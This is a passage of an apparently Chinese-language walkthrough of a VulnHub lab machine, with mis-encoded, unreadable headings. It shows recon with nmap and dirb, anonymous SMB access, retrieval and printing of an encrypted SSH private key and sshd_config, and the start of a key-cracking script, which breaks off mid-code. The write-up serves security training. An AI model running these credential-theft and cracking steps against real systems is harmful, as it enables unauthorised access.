(RPC #100227)</span><br><span class="line">2121/tcp open  ftp         ProFTPD 1.3.5</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx   3 root     root           16 Feb 19  2020 pub [NSE: writeable]</span><br><span class="line">MAC Address: 00:0C:29:D5:67:2B (VMware)</span><br><span class="line">Service Info: Host: FILESERVER; OS: Unix</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -1h49m53s, deviation: 3h10m19s, median: 0s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.9.1)</span><br><span class="line">|   Computer name: localhost</span><br><span class="line">|   NetBIOS computer name: FILESERVER\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: localhost</span><br><span class="line">|_  System time: 2020-09-26T01:39:56+05:30</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-09-25T20:09:36</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 58.30 seconds</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure>

<h2 id="0x03-è®¿é—®80ç«¯å£"><a href="#0x03-è®¿é—®80ç«¯å£" class="headerlink" title="0x03.è®¿é—®80ç«¯å£"></a>0x03.è®¿é—®80ç«¯å£</h2><p><code>ä»…ä»…æ˜¯ä¸€ä¸ªé™æ€é¡µé¢ï¼Œä¸”å¯ä»¥é‡å®šå‘åˆ°ä¸€ä¸ªç½‘ç«™</code></p>
<img src="/2020/09/26/CK-03/image-20200925201803610.png" class>

<h2 id="0x04-æ‰«æç›®å½•"><a href="#0x04-æ‰«æç›®å½•" class="headerlink" title="0x04.æ‰«æç›®å½•"></a>0x04.æ‰«æç›®å½•</h2><p><code>å¾—åˆ°.sshç›®å½•</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# dirb http://192.168.1.14</span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">START_TIME: Fri Sep 25 16:26:08 2020</span><br><span class="line">URL_BASE: http://192.168.1.14/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line">---- Scanning URL: http://192.168.1.14/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.14/.ssh/</span><br><span class="line">+ http://192.168.1.14/cgi-bin/ (CODE:403|SIZE:210)</span><br><span class="line">+ http://192.168.1.14/index.html (CODE:200|SIZE:174)                              </span><br><span class="line">---- Entering directory: http://192.168.1.14/.ssh/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Fri Sep 25 16:26:12 2020</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 2</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure>

<h2 id="0x05-æµè§ˆ-sshç›®å½•"><a href="#0x05-æµè§ˆ-sshç›®å½•" class="headerlink" title="0x05.æµè§ˆ.sshç›®å½•"></a>0x05.æµè§ˆ.sshç›®å½•</h2><p><code>å‘ç°ä¸¤ä¸ªæ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªä¸ºå…¬é’¥ï¼Œç¬¬äºŒä¸ªä¸ºç§é’¥ï¼Œä½†æ‹’ç»è®¿é—®</code></p>
<img src="/2020/09/26/CK-03/image-20200925202904665.png" class>

<p><code>æµè§ˆæ–‡ä»¶</code></p>
<img src="/2020/09/26/CK-03/image-20200925203157919.png" class>

<img src="/2020/09/26/CK-03/image-20200925203239246.png" class>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaOJE+/p4Y988V1I/soMH5RgdIavic3jBph74ZSUGWCf9I8mdmA6BszNd/QIxSbCXufb8r/yPMuoTDetJNXHyvb3RvPsSQ86N12G+ZaQATcGdf67S8WB+9vGJAPRxbbZiaokBjNXkGvAXs2mDhhtgiNjbnn3fb4KNvdeNJ/+xhZCRwknmKtf55zMgv2kFXFfmJO0kVogVYncnmsNohd0wJuImDJVHuGqvg9KmFCjb/gMhfh0jTIZB7cuseaKAzY8O2g4tMRNyVG5zwAmHkH0D00Du6ssXn1ZMCRq/imdDV7It1+L14d6bDTRCqm2FLRcKcx5PohJC1ElnzTkvhalEx smbuser@FileServer_CK10-test</span><br></pre></td></tr></table></figure>

<h2 id="0x06-æµè§ˆSMBæœåŠ¡å™¨ç«¯æ‰€åˆ†äº«å‡ºæ¥çš„æ‰€æœ‰èµ„æº"><a href="#0x06-æµè§ˆSMBæœåŠ¡å™¨ç«¯æ‰€åˆ†äº«å‡ºæ¥çš„æ‰€æœ‰èµ„æº" class="headerlink" title="0x06.æµè§ˆSMBæœåŠ¡å™¨ç«¯æ‰€åˆ†äº«å‡ºæ¥çš„æ‰€æœ‰èµ„æº"></a>0x06.æµè§ˆSMBæœåŠ¡å™¨ç«¯æ‰€åˆ†äº«å‡ºæ¥çš„æ‰€æœ‰èµ„æº</h2><p><code>å¯ä»¥å‘ç°ä¸¤ä¸ªç›®å½•ä¸ºsmbdataã€smbuserï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸¤ä¸ªç”¨æˆ·</code></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2FtYmEub3JnL3NhbWJhL2RvY3MvY3VycmVudC9tYW4taHRtbC9zbWJjbGllbnQuMS5odG1s">smbclientå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# smbclient -L 192.168.1.14</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        smbdata         Disk      smbdata</span><br><span class="line">        smbuser         Disk      smbuser</span><br><span class="line">        IPC$            IPC       IPC Service (Samba 4.9.1)</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure>

<h2 id="0x07-ç™»å…¥åˆ°æœåŠ¡ç«¯"><a href="#0x07-ç™»å…¥åˆ°æœåŠ¡ç«¯" class="headerlink" title="0x07.ç™»å…¥åˆ°æœåŠ¡ç«¯"></a>0x07.ç™»å…¥åˆ°æœåŠ¡ç«¯</h2><p><code>smbdataå¯ä»¥æŸ¥çœ‹ï¼Œsmbuserä¸å¯ä»¥æŸ¥çœ‹</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# smbclient \\\\192.168.1.14\\smbdata</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line">Anonymous login successful</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Thu Mar 19 00:53:12 2020</span><br><span class="line">  ..                                  D        0  Tue Feb 18 06:47:54 2020</span><br><span class="line">  anaconda                            D        0  Tue Feb 18 06:48:15 2020</span><br><span class="line">  audit                               D        0  Tue Feb 18 06:48:15 2020</span><br><span class="line">  boot.log                            N     6120  Tue Feb 18 06:48:16 2020</span><br><span class="line">  btmp                                N      384  Tue Feb 18 06:48:16 2020</span><br><span class="line">  cron                                N     4813  Tue Feb 18 06:48:16 2020</span><br><span class="line">  dmesg                               N    31389  Tue Feb 18 06:48:16 2020</span><br><span class="line">  dmesg.old                           N    31389  Tue Feb 18 06:48:16 2020</span><br><span class="line">  glusterfs                           D        0  Tue Feb 18 06:48:16 2020</span><br><span class="line">  lastlog                             N   292292  Tue Feb 18 06:48:16 2020</span><br><span class="line">  maillog                             N     1982  Tue Feb 18 06:48:16 2020</span><br><span class="line">  messages                            N   684379  Tue Feb 18 06:48:17 2020</span><br><span class="line">  ppp                                 D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  samba                               D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  secure                              N    11937  Tue Feb 18 06:48:17 2020</span><br><span class="line">  spooler                             N        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  tallylog                            N        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  tuned                               D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  wtmp                                N    25728  Tue Feb 18 06:48:17 2020</span><br><span class="line">  xferlog                             N      100  Tue Feb 18 06:48:17 2020</span><br><span class="line">  yum.log                             N    10915  Tue Feb 18 06:48:17 2020</span><br><span class="line">  sshd_config                         N     3906  Wed Feb 19 02:46:38 2020</span><br><span class="line">  todo                                N      162  Tue Feb 25 09:22:29 2020</span><br><span class="line">  id_rsa                              N     1766  Thu Mar 19 00:43:16 2020</span><br><span class="line">  note.txt                            N      128  Thu Mar 19 00:53:12 2020</span><br><span class="line"></span><br><span class="line">                19976192 blocks of size 1024. 18256884 blocks available</span><br><span class="line">smb: \&gt;</span><br><span class="line">root@JIYE:~/vulnhub/ck00# smbclient \\\\192.168.1.14\\smbuser</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line">Anonymous login successful</span><br><span class="line">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure>

<p><code>ä¸‹è½½id_rsaä¸sshd_config</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">smb: \&gt; get id_rsa</span><br><span class="line">getting file \id_rsa of size 1766 as id_rsa (143.7 KiloBytes/sec) (average 143.7 KiloBytes/sec)</span><br><span class="line">smb: \&gt; get sshd_config</span><br><span class="line">getting file \sshd_config of size 3906 as sshd_config (1907.1 KiloBytes/sec) (average 395.6 KiloBytes/sec)</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹ç§é’¥</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# ls</span><br><span class="line">id_rsa  nmap.CVT  nmap.sP  sshd_config</span><br><span class="line">root@JIYE:~/vulnhub/ck00# cat id_rsa </span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,0111C403C183156C592743C68EA855BD</span><br><span class="line"></span><br><span class="line">TRNiuBMH2lIgWgYpBb4MgbhQtW84gdUTJDRQLp/qwBv/KTbycWu+R07J2lGEFJH8</span><br><span class="line">8G1nZ+bjnPayjTyywY5PGySQ4k5pWvmNin16TEAII7XO6Jv+/Ev/N4sPdKe7K3bN</span><br><span class="line">TpJ39S5DVuj4oTTswvUp3dYU6ynu3Qp9PBRdBJnazbK5hwkxOyqa5l1dCfRDpaWf</span><br><span class="line">hPM+GhXbHOvzj+Z9wvlrTuPASsBrCnXd/MAxRmNfDMCHlPHVATEChoP89awwoti5</span><br><span class="line">itxcxqIWGIqilnlm7Dcy2lynE7LlXdXyJAnUI0Plra9PTqC4QoJL3Lyesypzp9Xk</span><br><span class="line">kB9Hv25vherfgjy6AKBcIqZuALtFL2mij7nYC21XxcDudKCaB+UxOQhGBLNN0E16</span><br><span class="line">7bNvnKebLmhyWhDNVaelvF9cd+mxvvPzv5ljhUd3jvhhyU70AgzrpF1ZUxVh2GOs</span><br><span class="line">huzbtCIwX3I+xAQYdw+sThTRG8GcXLjreEUF4gJqlPNWk9gxH/AmfTmGKdLhhoSb</span><br><span class="line">/7wHeMvLwSRaVv6fyPXhPpiB5c3MHCoHFYi6sbmmtYXJBum9fF9iubIzlRu/4vZ2</span><br><span class="line">irmnsEff3vkqqPchb6M0zMtw80QPJgpjhclJjDPiI5P1DWjgLNYOQba0nKNQ3RFa</span><br><span class="line">iy2lup+EsCqWU0KTI+hH+Xm0YAq2/ESqPeNp/U+78y8L5JkpavRYNJyx+vGV8XPP</span><br><span class="line">dGkZD8x68xLIwF6/urZC6utRa1HgyEDIcUbyTUnbRkLUFWbN9eHLrY0pH+zhKJOj</span><br><span class="line">14cUAOpB9RkxAoE6YJ03vJq72OoxfCYhiv3fj4pQRuQJwA2c8IfgdwIJqBIMVPvV</span><br><span class="line">5HX3j5ugkyocLl5Rg+oXjyhNczmABJehk9gA0eCcfQpXGPw/OBMJ4BJdUHxbCOtQ</span><br><span class="line">lAstu+fNBosFhkj3lHXX/ZNIKcYs9+Mvs3E2DvmcK7Us/59qsCwHRZNvd2E3EF9r</span><br><span class="line">nNuHg8sY5HxMvMNH46PH8c4EesuNvOW2pvaCHCT5Id3Up1yyP09hoxyyovnPQ/Gj</span><br><span class="line">HXffEjkc82t9Ip476mfo0NBzB4g7sOb4ZXhG8RxHS4d83S5bITzHP8RrlmkdKCjH</span><br><span class="line">U5YMap/xQ++4XTtgX8DjVoZw1imRtNsCQk6fe0UVKzg2nFV8rkOU8A1o6NDcjE/Z</span><br><span class="line">V/PsYJT3CTEvlzq1/4lLQN2nLrpwmlu+Ate5CEmKxqDIpSIzQBl5N4cU5aa/L1XG</span><br><span class="line">2nFA4H1Ipo7CaUQZ3lQGC/wHaWcP0KnZQ/SrInGOQVu1RJe3MhyG3TyC06FVfmgV</span><br><span class="line">m4oqf39lGQlYX8+cTCK8w6nI6gnSsW92U9j5s9iGEZKN2bI1poyurQaExFiDub6m</span><br><span class="line">QzYWqY1+EUBUYzFMlR08TeHXLvoAmgJNcnZlhXuhWsl6z95UMKvRBLN3Dc4kIVZx</span><br><span class="line">sBZmlYhqhwl0AWYQOl1tJrOMiqLeMhF+xWZ3J/iZ9Pj37Dz9xL8YiA8YUNC/NqT+</span><br><span class="line">3j1s3USXPL0uyxS7tnJJf3aXMBi0XwwHWZg4ii8JQhGiiPhGBE9lpRyPhYCx3xDC</span><br><span class="line">ED/GW22/sWS5fhDr4tynP8VdjiFwbBEcXYHa84XjeUZZaLJQTSwnE/afWVYty8AX</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">root@JIYE:~/vulnhub/ck00# </span><br><span class="line">root@JIYE:~/vulnhub/ck00# cat sshd_config </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#      $OpenBSD: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp $</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This is the sshd server system-wide configuration file.  See</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sshd_config(5) <span class="keyword">for</span> more information.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This sshd was compiled with PATH=/usr/<span class="built_in">local</span>/bin:/usr/bin</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The strategy used <span class="keyword">for</span> options <span class="keyword">in</span> the default sshd_config shipped with</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> OpenSSH is to specify options with their default value <span class="built_in">where</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> possible, but leave them commented.  Uncommented options override the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> default value.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> If you want to change the port on a SELinux system, you have to tell</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> SELinux about this change.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> semanage port -a -t ssh_port_t -p tcp <span class="comment">#PORTNUMBER</span></span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Port 22</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AddressFamily any</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ListenAddress 0.0.0.0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ListenAddress ::</span></span><br><span class="line"></span><br><span class="line">HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line"><span class="meta">#</span><span class="bash">HostKey /etc/ssh/ssh_host_dsa_key</span></span><br><span class="line">HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ed25519_key</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Ciphers and keying</span></span><br><span class="line"><span class="meta">#</span><span class="bash">RekeyLimit default none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Logging</span></span><br><span class="line"><span class="meta">#</span><span class="bash">SyslogFacility AUTH</span></span><br><span class="line">SyslogFacility AUTHPRIV</span><br><span class="line"><span class="meta">#</span><span class="bash">LogLevel INFO</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Authentication:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">LoginGraceTime 2m</span></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"><span class="meta">#</span><span class="bash">StrictModes yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxAuthTries 6</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxSessions 10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">PubkeyAuthentication yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> but this is overridden so installations will only check .ssh/authorized_keys</span></span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedPrincipalsFile none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedKeysCommand none</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedKeysCommandUser nobody</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> For this to work you will also need host keys <span class="keyword">in</span> /etc/ssh/ssh_known_hosts</span></span><br><span class="line"><span class="meta">#</span><span class="bash">HostbasedAuthentication no</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change to yes <span class="keyword">if</span> you don<span class="string">&#x27;t trust ~/.ssh/known_hosts for</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> HostbasedAuthentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash">IgnoreUserKnownHosts no</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Don<span class="string">&#x27;t read the user&#x27;</span>s ~/.rhosts and ~/.shosts files</span></span><br><span class="line"><span class="meta">#</span><span class="bash">IgnoreRhosts yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> To <span class="built_in">disable</span> tunneled clear text passwords, change to no here!</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PasswordAuthentication yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitEmptyPasswords no</span></span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change to no to <span class="built_in">disable</span> s/key passwords</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ChallengeResponseAuthentication yes</span></span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Kerberos options</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosAuthentication no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosOrLocalPasswd yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosTicketCleanup yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosGetAFSToken no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosUseKuserok yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> GSSAPI options</span></span><br><span class="line">GSSAPIAuthentication yes</span><br><span class="line">GSSAPICleanupCredentials no</span><br><span class="line"><span class="meta">#</span><span class="bash">GSSAPIStrictAcceptorCheck yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">GSSAPIKeyExchange no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">GSSAPIEnablek5users no</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set this to <span class="string">&#x27;yes&#x27;</span> to <span class="built_in">enable</span> PAM authentication, account processing,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and session processing. If this is enabled, PAM authentication will</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> be allowed through the ChallengeResponseAuthentication and</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PasswordAuthentication.  Depending on your PAM configuration,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PAM authentication via ChallengeResponseAuthentication may bypass</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> the setting of <span class="string">&quot;PermitRootLogin without-password&quot;</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> If you just want the PAM account and session checks to run without</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PAM authentication, <span class="keyword">then</span> <span class="built_in">enable</span> this but <span class="built_in">set</span> PasswordAuthentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and ChallengeResponseAuthentication to <span class="string">&#x27;no&#x27;</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> WARNING: <span class="string">&#x27;UsePAM no&#x27;</span> is not supported <span class="keyword">in</span> Red Hat Enterprise Linux and may cause several</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> problems.</span></span><br><span class="line">UsePAM yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AllowAgentForwarding yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AllowTcpForwarding yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">GatewayPorts no</span></span><br><span class="line">X11Forwarding yes</span><br><span class="line"><span class="meta">#</span><span class="bash">X11DisplayOffset 10</span></span><br><span class="line"><span class="meta">#</span><span class="bash">X11UseLocalhost yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitTTY yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PrintMotd yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PrintLastLog yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">TCPKeepAlive yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">UseLogin no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">UsePrivilegeSeparation sandbox</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitUserEnvironment no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Compression delayed</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ClientAliveInterval 0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ClientAliveCountMax 3</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ShowPatchLevel no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">UseDNS yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PidFile /var/run/sshd.pid</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxStartups 10:30:100</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitTunnel no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ChrootDirectory none</span></span><br><span class="line"><span class="meta">#</span><span class="bash">VersionAddendum none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> no default banner path</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Banner none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Accept locale-related environment variables</span></span><br><span class="line">AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES</span><br><span class="line">AcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT</span><br><span class="line">AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE</span><br><span class="line">AcceptEnv XMODIFIERS</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> override default of no subsystems</span></span><br><span class="line">Subsystem       sftp    /usr/libexec/openssh/sftp-server</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Example of overriding settings on a per-user basis</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Match User anoncvs</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       X11Forwarding no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       AllowTcpForwarding no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       PermitTTY no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       ForceCommand cvs server</span></span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure>

<h2 id="0x08-johnç ´è§£"><a href="#0x08-johnç ´è§£" class="headerlink" title="0x08.johnç ´è§£"></a>0x08.johnç ´è§£</h2><p><code>å…ˆhashid_rsa</code></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RydW9uZ2ttYS9jdGYtdG9vbHMvYmxvYi9tYXN0ZXIvSm9obi9ydW4vc3Nobmcyam9obi5weQ==">toolsåœ°å€<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> hashlib <span class="keyword">import</span> md5 <span class="keyword">as</span> MD5</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">from</span> md5 <span class="keyword">import</span> md5 <span class="keyword">as</span> MD5</span><br><span class="line"></span><br><span class="line">limited = <span class="literal">True</span>  <span class="comment"># set to False for &quot;development&quot; mode!</span></span><br><span class="line"></span><br><span class="line">PY3 = sys.version_info[<span class="number">0</span>] == <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> PY3:</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">from</span> StringIO <span class="keyword">import</span> StringIO</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3, AES</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    AES = Object()</span><br><span class="line">    AES.MODE_CBC = <span class="string">&quot;&quot;</span></span><br><span class="line">    DES3 = Object()</span><br><span class="line">    DES3.MODE_CBC = <span class="string">&quot;&quot;</span></span><br><span class="line">    limited = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BERException</span> (<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BER</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Robey&#x27;s tiny little attempt at a BER decoder.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, content=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        self.content = content</span><br><span class="line">        self.idx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.content</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;BER(\&#x27;&#x27;</span> + repr(self.content) + <span class="string">&#x27;\&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.decode_next()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_next</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.idx &gt;= len(self.content):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        ident = ord(self.content[self.idx])</span><br><span class="line">        self.idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (ident &amp; <span class="number">31</span>) == <span class="number">31</span>:</span><br><span class="line">            <span class="comment"># identifier &gt; 30</span></span><br><span class="line">            ident = <span class="number">0</span></span><br><span class="line">            <span 